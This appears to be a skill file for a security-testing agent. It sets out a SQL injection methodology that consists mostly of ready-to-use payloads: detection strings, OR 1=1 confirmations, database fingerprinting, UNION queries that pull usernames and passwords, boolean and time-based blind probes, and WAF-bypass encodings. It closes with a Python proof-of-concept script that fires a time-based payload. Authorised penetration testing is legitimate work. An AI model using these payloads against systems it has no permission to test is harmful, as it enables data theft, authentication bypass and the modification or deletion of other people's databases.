---
name: sqli
description: SQL Injection testing methodology with payloads for union, blind, time-based, and error-based attacks
version: 1.0.0
tags: [injection, database, A03:2021]
---

# SQL Injection Testing Methodology

## Overview
SQL Injection allows attackers to interfere with database queries, potentially accessing or modifying data.

## Types
1. **Union-based**: Extract data via UNION SELECT
2. **Error-based**: Extract data via error messages
3. **Blind Boolean**: Infer data from true/false responses
4. **Blind Time-based**: Infer data from response delays
5. **Stacked Queries**: Execute multiple statements

## Testing Methodology

### 1. Detection
```
'
"
`
')
")
`)
'))
"))
`))
```

### 2. Confirm Injection
```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
" OR "1"="1
1 OR 1=1
1' OR '1'='1
```

### 3. Database Identification
```sql
-- MySQL
' AND 1=1 AND 'a'='a
SELECT @@version
SELECT version()

-- PostgreSQL
' AND 1=1 --
SELECT version()

-- MSSQL
'; SELECT @@version--
' AND 1=1--

-- Oracle
' AND 1=1--
SELECT banner FROM v$version
```

### 4. Union-based Extraction
```sql
-- Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### 5. Blind Boolean
```sql
' AND 1=1--     (true)
' AND 1=2--     (false)
' AND SUBSTRING(username,1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--
```

### 6. Time-based
```sql
-- MySQL
' AND SLEEP(5)--
' AND BENCHMARK(10000000,SHA1('test'))--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
```

### 7. WAF Bypass
```sql
' /*!50000OR*/ '1'='1
' OR/**/'1'='1
'+OR+'1'='1
' || '1'='1
%27%20OR%20%271%27%3D%271
```

## PoC Template
```python
import requests
import time

def test_sqli(url, param):
    # Test time-based blind
    payload = "' AND SLEEP(5)--"
    start = time.time()
    r = requests.get(url, params={param: payload})
    elapsed = time.time() - start
    
    if elapsed >= 5:
        print(f"[+] Time-based SQLi found!")
        return True
    return False
```

## Impact
- Data theft
- Authentication bypass
- Data modification/deletion
- Remote code execution (in some cases)
